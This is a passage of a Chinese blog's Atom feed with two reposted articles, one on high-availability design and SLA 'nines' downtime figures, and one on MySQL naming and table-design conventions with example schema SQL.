    <title>关于高可用的系统一点思考</title>
    <link href="https://t1ger.github.io/2016/11/11/%E5%85%B3%E4%BA%8E%E9%AB%98%E5%8F%AF%E7%94%A8%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/"/>
    <id>https://t1ger.github.io/2016/11/11/关于高可用的系统一点思考/</id>
    <published>2016-11-11T09:42:34.000Z</published>
    <updated>2016-11-13T13:40:28.626Z</updated>
    
    <content type="html"><![CDATA[<p>写在前面，此文章为转载，略微整理</p>
<h4 id="理解高可用系统"><a href="#理解高可用系统" class="headerlink" title="理解高可用系统"></a><b>理解高可用系统</b></h4><p>高可用，顾名思义就是要我们的计算环境(包括软硬件)做到full-time的可用性。通常在需要做好如下设计：</p>
<ul>
<li>对软硬件的冗余，以消除单点故障。任何系统都会有一个或多个冗余系统做standby</li>
<li>对故障的检测和恢复。检测故障以及用备份的节点接管故障点。就是我们常说的failover</li>
<li>需要很可靠的交汇点(CrossOver)。eg. 域名解析、负载均衡等</li>
</ul>
<p>说起来很简单，然而，细节决定成败，冗余节点最大的难题就是有状态的节点数据复制和数据一致性的保证(无状态节点冗余相对简单)：</p>
<ul>
<li>如果系统的数据镜像到冗余节点是异步的，那么failover的时候就会出现数据差异</li>
<li>如果系统在数据镜像到冗余节点是同步的，那么会导致冗余节点越多性能越慢。</li>
</ul>
<p>所以，很多高可用系统都是在做各种取舍，这需要比对着业务的特点来的，比如银行账号的余额是一个状态型的数据，那么，冗余时就必需做到强一致性，再比如说，订单记录属于追加性的数据，那么在failover的时候，就可以到备机上进行追加，这样就比较简单了。</p>
<p>下面，总结一下高可用的设计原理：</p>
<ul>
<li>要做到数据不丢，就必须持久化</li>
<li>要做到服务高可用，必须有备用，无论是应用结点还是数据结点</li>
<li>要做到复制，就会有数据一致性的问题</li>
<li>我们不可能做到100%的高可用，即我们能做到几个9的SLA</li>
</ul>
<h4 id="高可用技术方案的示例"><a href="#高可用技术方案的示例" class="headerlink" title="高可用技术方案的示例"></a><b>高可用技术方案的示例</b></h4><p>简单解释一下MySQL的这几个方案（主要是想表达一个越多的9就越复杂）</p>
<ul>
<li>Mysql Repleaction(一般配合keepalived 实现failover) 是传统的异步数据同步或是半同步Semi-Sync(只要有一个slave收到更新就返回成功）这个方式本质上不到2个9)</li>
<li>MMM/MHA通过MySQL replication技术可以实现两个服务器互为主从，且在任何时候只有一个节点可以被写入，避免了多点写入的数据冲突。同时，当可写的主节点故障时，MMM/MHA套件可以立刻监控到，然后将服务自动切换到另一个主节点，继续提供服务，从而实现MySQL的高可用。这个方案的可用性可以达到99%。备注：MMM项目已于2012停止更新</li>
<li>DRBD通过底层的磁盘同步技术来解决数据同步的问题，就是RAID 1——把两台以上的主机的硬盘镜像成一个。这个方案不到3个9</li>
<li>Solaris Clustering/Oracle VM ，这个机制监控了包括硬件、操作系统、网络和数据库。这个方案一般会伴随着节点间的“心跳机制”，而且还会动用到SAN（Storage Area Network）或是本地的分布式存储系统，还会动用虚拟化技术来做虚拟机的迁移以降低宕机时间的概率。这个解决方案完全就是一个“全栈式的解决方案”。这个方案接近4个9</li>
<li>MySQL Cluster是官方的一个开源方案，其把MySQL的集群分成SQL Node 和Data Node，Data Node是一个自动化sharing和复制的集群NDB，为了更高的可用性，MySQL Cluster采用了“完全同步”的数据复制的机制来冗余数据结点。这个方案接近5个9</li>
</ul>
<p>那么，这些2个9，3个9，4个9，5个9是什么意思呢？又是怎么来的呢？请往下看。</p>
<h4 id="高可用性SLA的定义"><a href="#高可用性SLA的定义" class="headerlink" title="高可用性SLA的定义"></a><b>高可用性SLA的定义</b></h4><p>重点来了，工业界有两种方法来测量SLA</p>
<ul>
<li>一个是故障发生到恢复的时间</li>
<li>另一个是两次故障间的时间</li>
</ul>
<p>通常我们采用前者，即故障发生到恢复的时间，也就是服务不可用时间</p>
<table>
<thead>
<tr>
<th style="text-align:left">系统可用性</th>
<th style="text-align:left">宕机时间/年</th>
<th style="text-align:left">宕机时间/月</th>
<th style="text-align:left">宕机时间/周</th>
<th style="text-align:left">宕机时间/天</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">90% (1个9)</td>
<td style="text-align:left">36.5 天</td>
<td style="text-align:left">72 小时</td>
<td style="text-align:left">16.8 小时</td>
<td style="text-align:left">2.4 小时</td>
</tr>
<tr>
<td style="text-align:left">99% (2个9)</td>
<td style="text-align:left">3.65 天</td>
<td style="text-align:left">7.20 小时</td>
<td style="text-align:left">1.68 小时</td>
<td style="text-align:left">14.4 分</td>
</tr>
<tr>
<td style="text-align:left">99.9% (3个9)</td>
<td style="text-align:left">8.76 小时</td>
<td style="text-align:left">43.8 分</td>
<td style="text-align:left">10.1 分钟</td>
<td style="text-align:left">1.44 分</td>
</tr>
<tr>
<td style="text-align:left">99.99% (4个9)</td>
<td style="text-align:left">52.56 分</td>
<td style="text-align:left">4.38 分</td>
<td style="text-align:left">1.01 分钟</td>
<td style="text-align:left">8.66 秒</td>
</tr>
<tr>
<td style="text-align:left">99.999% (5个9)</td>
<td style="text-align:left">5.26 分</td>
<td style="text-align:left">25.9 秒</td>
<td style="text-align:left">6.05 秒</td>
<td style="text-align:left">0.87 秒</td>
</tr>
</tbody>
</table>
<p>比如，99.999%的可用性，一年只能有5分半钟的服务不可用。感觉很难做到吧。<br>到 3 个 9 可以靠堆人，也就是 3 班倒之类的强制值班基本搞定。但是从 3 个 9 往上，就基本超出了人力的范畴，考验的是业务的自愈能力，架构的容灾、容错设计，灾备系统的完善等等。<br>据说Google 内部只有 4 个 9 以上的服务才会配备 SRE，SRE 是必须在接到报警 5 分钟之内上线处理问题的，否则报警系统自动升级到下一个 SRE。如果还没有，直接给老板发报警。</p>
<p>简而言之，SLA的几个9就是能持续提供可用服务的级别，不过，工业界中，会把服务不可用的因素分成两种：一种是有计划的，一种是无计划的。</p>
<p>无计划的</p>
<ul>
<li>系统级故障-包括主机、操作系统、中间件、数据库、网络、电源以及外围设备</li>
<li>数据和中介的故障-包括人员误操作、硬盘故障、数据乱了</li>
<li>外部因素-自然灾害、人为破坏、以及供电问题</li>
</ul>
<p>有计划的</p>
<ul>
<li>日常任务-备份、容量规划、用户和安全管理，后台批处理应用</li>
<li>运维相关-数据库维护、应用维护、中间件维护、操作系统维护、网络维护</li>
<li>升级相关-数据库、应用、中间件、操作系统、网络、包括硬件升级</li>
</ul>
<p>有计划的维护因素主要来自于变更管理，避免措施主要有以下几个方面：</p>
<ul>
<li>线下测试（Offline Test）</li>
<li>灰度发布</li>
<li>服务必须对回滚提供支持</li>
</ul>
<p>针对回滚，跟大家分享一下，保证药到病除：</p>
<p>理由1：我这个数据改动之后格式跟以前的不兼容了，回退也不能正常！<br>秘籍1：设计、开发时候就考虑好兼容性问题！！！比如说数据库改字段的事就不要做，改成另加一个字段就好。数据存储格式就最好采用 protobuf 这种支持数据版本、支持前后兼容性的方案。最差的情况，也要在变更实施『之前』，想清楚数据兼容性的问题。没有回滚脚本，不给更新，起码做到有备而战。</p>
<p>理由2：我这个变更删掉东西了！回退之后数据也没了！<br>秘籍2：你一定是在逗我。把这个变更打回去，分成两半。第一半禁止访问这个数据。等到发布之后真没问题了，再来发布第二半，第二半真正删掉数据。这样第一半实施之后需要回滚还可以再回去。</p>
<p>理由3：我这个变更发布了之后, 其他依赖这个系统的人都拿到了错误的数据，再回退也没用了，他们不会再接受老数据了！<br>秘籍3：这种比较常见出现在配置管理、缓存等系统中。对这类问题，最重要的就是，应该开发一种跟版本无关的刷新机制。触发刷新的机制应该独立于发布过程。 要有一个强制刷新数据的手段。</p>
<p>以上三个秘籍覆盖了100%的回滚兼容性问题，如果有不存在的，请务必告诉我！</p>
<h4 id="决定高可用的本质原因"><a href="#决定高可用的本质原因" class="headerlink" title="决定高可用的本质原因"></a><b>决定高可用的本质原因</b></h4><p><b>通过上述影响SLA的因素，我们可以看出实现5个9意味着一年的时间只能有5分钟不可用，如果没有一支技术牛逼的团队加上一套自动化的工具，怎么能有高可用系统呢</b></p>
<p>要实现高可用系统，其中包括但不限于：</p>
<ul>
<li>软件的设计、编码、测试、上线和软件配置的水平</li>
<li>工程师的技术水平</li>
<li>运维的管理和技术水平</li>
<li>数据中心的运营管理水平</li>
<li>依赖于第三方服务的管理水平</li>
</ul>
<p>ref<br><a href="http://coolshell.cn/articles/17459.htm" target="_blank" rel="external">关于高可用的系统</a><br><a href="https://blog.coding.net/blog/architecture-concept-and-practice-from-Google" target="_blank" rel="external">来自 Google 的高可用架构理念与实践</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      think about High Availability
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mysql数据库设计规范</title>
    <link href="https://t1ger.github.io/2016/11/11/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E8%A7%84%E8%8C%83/"/>
    <id>https://t1ger.github.io/2016/11/11/mysql数据库设计规范/</id>
    <published>2016-11-11T03:55:39.000Z</published>
    <updated>2016-11-13T12:40:03.054Z</updated>
    
    <content type="html"><![CDATA[<p>写在前面，此文章为转载，略微整理</p>
<h4 id="一、命名规范"><a href="#一、命名规范" class="headerlink" title="一、命名规范"></a>一、<b>命名规范</b></h4><p>[数据库环境介绍]</p>
<ul>
<li>开发环境(dev)：开发人员可读写，在不影响其他开发同事时可随意修改</li>
<li>测试环境(qa)：开发和测试可读写，可通过工具修改表结构</li>
<li>模拟环境(sim): 开发可读写，当有上线请求，会在这个环境预执行，这个环境供部署上线演练和压力测试使用</li>
<li>生产数据库从库(stage): 只读环境，不允许修改数据，不允许修改表结构；供线上排查问题，数据查询使用</li>
<li>生产环境(product): 开发不允许直接进行数据库操作，必须通过DBA进行操作并进行记录</li>
</ul>
<p>不同环境的机器，需要做到权限明确，读写账户分离，能区分具体业务。eg. r_dev,w_dev </p>
<p>[数据库命名规范]</p>
<ul>
<li>简洁明了，体现数据库的用途,建议使用名词</li>
<li>使用英文小写字母、下划线命名，不宜过长(12个字符以内)</li>
<li>默认字符集统一utf-8,如果需要存储emoj表情，需要使用UTF8mb4</li>
</ul>
<p>[表命名规范]</p>
<ul>
<li>具有统一前缀，相关功能表使用相同前缀(前缀名称一般不超过5字)，体现相关业务,建议使用名词</li>
<li>避免用ORACLE、MySQL的保留字，如desc，关键字如index</li>
<li>使用英文小写字母、下划线命名，不宜过长(12个字符以内)</li>
<li>引擎默认使用innodb,日志或报表酌情使用myisam(mysql8.0已经移除)</li>
<li>必须有主键，建议使用auto_increment的id作为主键（与业务无关）,和业务相关的要做为唯一索引；</li>
<li>所有的表都必须有注释，解释其存放的数据内容</li>
<li>预估数据量，如数据量比较大(char的表&gt;500W行，或int表&gt;1000W)需要考虑分表。分表策略与DBA协商</li>
<li>功能相近的，命名规则应该统一</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">CREATE TABLE `app_store_log` (</div><div class="line">  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT &apos;自增ID&apos;,</div><div class="line">  `appid` int(11) NOT NULL COMMENT &apos;应用ID&apos;,</div><div class="line">  `create_time` int(11) NOT NULL COMMENT &apos;建立时间&apos;,</div><div class="line">  PRIMARY KEY (`id`),</div><div class="line">  UNIQUE KEY `appid` (`appid`)</div><div class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT=&apos;应用商店记录表&apos;</div></pre></td></tr></table></figure>
<p>[字段命名规范]</p>
<ul>
<li>数据库字段命名与表命名相似</li>
<li>字段应该有注释，描述字段用途及必要内容的解释</li>
<li>外键统一用xxx-id的方式声明</li>
<li>表主键默认约定为id,自增类型</li>
<li>时间字段，除特殊情况一律采用int记录unix_timestamp</li>
<li>网络IP字段，除特殊情况一律采用bigint来记录inet_aton值</li>
<li>默认字段均为非空，最好指定默认值</li>
<li>有些驱动对tingint支持不够好，通常建议按容量来选择字段</li>
<li>text字段尽量少用，或者拆分到冗余表</li>
<li>对表加新字段，不允许指定字段位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">CREATE TABLE `login_user` (</div><div class="line">  `id` int(10) NOT NULL AUTO_INCREMENT,</div><div class="line">  `jid` int(10) unsigned NOT NULL,</div><div class="line">  `user_id` int(10) NOT NULL COMMENT &apos;用户的id&apos;,</div><div class="line">  `username` varchar(50) NOT NULL COMMENT &apos;用户姓名&apos;,</div><div class="line">  `city` smallint(4) NOT NULL COMMENT &apos;城市&apos;,</div><div class="line">  `ip` bigint(14) NOT NULL COMMENT &apos;登陆ip&apos;,</div><div class="line">  `district_id` tinyint(2) NOT NULL COMMENT &apos;所在区域的id&apos;,</div><div class="line">  `district_name` varchar(20) NOT NULL COMMENT &apos;行政区名字&apos;,</div><div class="line">  `street_id` tinyint(2) NOT NULL COMMENT &apos;所在街道(地标)的id&apos;,</div><div class="line">  `street_name` varchar(20) NOT NULL COMMENT &apos;小区名字&apos;,</div><div class="line">  `status` tinyint(2) NOT NULL DEFAULT &apos;1&apos; COMMENT &apos;用户状态:0禁用 1正常&apos;,</div><div class="line">  PRIMARY KEY (`id`),</div><div class="line">  UNIQUE KEY `idx_jid` (`jid`),</div><div class="line">  KEY `user_id_index` (`user_id`)</div><div class="line">) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COMMENT=&apos;用户登陆表&apos;</div><div class="line"></div><div class="line"></div><div class="line">ALTER TABLE T_APP_VERSION ADD COLUMN FSECURITY SMALLINT(5) NOT NULL DEFAULT 0 COMMENT &apos;安全扫描结果&apos;;</div></pre></td></tr></table></figure>
<h4 id="二、表设计原则"><a href="#二、表设计原则" class="headerlink" title="二、表设计原则"></a>二、<b>表设计原则</b></h4><p>[职责分离原则]<br>通常指数据的产生和使用，每个系统相互独立，通常取决于以下几点</p>
<ul>
<li>数据的产生：通常谁产生谁负责，维护数据的正个生命周期，产生，修改，销毁等周期。</li>
<li>使用数据者：谁使用谁维护</li>
<li>考虑高内聚，低耦合：在存放数据的时候如果考虑到数据使用原则导致了相关度非常高的数据存放在多个地方，需要多个系统来维护这个数据就有可能导致系统间的耦合性增强，应当尽量避免</li>
</ul>
<p>在设计数据库表间的关系时也要遵循相同原则，职责分离降低耦合，但同时要考虑到性能情况，做到适当冗余而不导致修改逻辑复杂</p>
<p>[在线处理和分析分离]</p>
<ul>
<li>为了保证生产环境数据处理性能，需要将一些分析相关的数据及结果单独库存储，避免在数据分析的时候导致业务数据吞吐量下降，引起系统问题</li>
<li>专门用于存放离线报表数据，并提供线上数据查询方法，建议将统计结果，汇总的数据都从在线处理数据库中移走</li>
</ul>
<p>原则上要将在线用户请求和后台统计请求分开:</p>
<p>a. 将后台统计与生产库分开(一般使用slave)，缺点是数据量大了玩不转。<br>b. 建立离线报表，专门存放统计结果，计算与展示异步处理，缺点是实时业务响应差。<br>c. 实时拉取mysql row binlog，做数据的异构处理(tungsten, canal)，将增量结果处理后(storm)，保存在数据库中，基本实时。</p>
<p>[事物与日志分离]</p>
<p>通常用户生成的内容和用户行为的日志要分开，eg:</p>
<p>游戏DB里存放玩家的基础信息，装备，属性，好友列表等等，这些放到数据库里面。但是玩家的行为日志，比如消耗金币，今天下过哪些副本，买过什么顶级装备，这些属于行为日志，应该单独存放并分析处理。</p>
<p>对于web，有好多用户置顶，刷新，竞价，展示等行为，要求实时并且量很大，一定要和贴子分开。</p>
<p>行为日志，需要做分析处理，并且由于时效性不宜存储在mysql中，后期维护就是地雷。</p>
<p>[历史可追溯]</p>
<p>保障数据可追溯，应当遵循一些简单的约定，事后方便数据的查询和统计：</p>
<ul>
<li><p>对于状态数据，应当设计相应状态的字段来保存该数据的最后状态，同时记录下来该数据的初始创建人，时间以及该数据的最后修改人和修改时间；所以在交易数据（如订单合同），广告数据，账户表等都应该默认有状态（status），创建人（creator/creator_name），创建时间（created_at），最后修改人（modifier/modifier_name），最后修改时间（modified_at）等字段用来表明数据的当前状态，创建信息及修改信息。</p>
</li>
<li><p>针对需要跟踪每次修改的数据，需要在数据发生变化的时候记录一张日志表，用于记录该数据发生变化的全生命周期。针对只需要关注关键字段变化的情况，则日志表中只需要记录关键字段变化即可，但操作人，操作类型，时间应当准确记录，日志表数据一旦生成不允许进行修改。如用户账户的充值流水，消费流水都是一些业务紧相关的日志。而审核日志，操作记录等日志则属于与业务关联较小的日志。</p>
</li>
<li><p>针对所有历史需要保留的数据则需要每次变化都生成一个新的版本，比如类目信息等，对原始数据永远只做insert操作，不做delete及update操作。但这种情况仅限于极端数据历史要求极高的情况下使用。</p>
</li>
</ul>
<p>ref </p>
<p><a href="http://verynull.com/2016/06/29/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E8%A7%84%E8%8C%83" target="_blank" rel="external">Mysql数据库设计规范</a><br><a href="http://www.cnblogs.com/chenpingzhao/p/5059985.html" target="_blank" rel="external">数据库使用的一些规范</a><br><a href="http://www.biaodianfu.com/mysql-best-practices.html" target="_blank" rel="external">MySQL命名、设计及使用规范</a><br><a href="https://github.com/sjqzhang/webtech/blob/master/doc/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E8%A7%84%E8%8C%83.md" target="_blank" rel="external">数据库设计规范.md</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      mysql database desgin guideline
    
    </summary>
    
    
      <category term="mysql" scheme="https://t1ger.github.io/tags/mysql/"/>
    
      <category term="desgin" scheme="https://t1ger.github.io/tags/desgin/"/>
    
  </entry>
  
</feed>
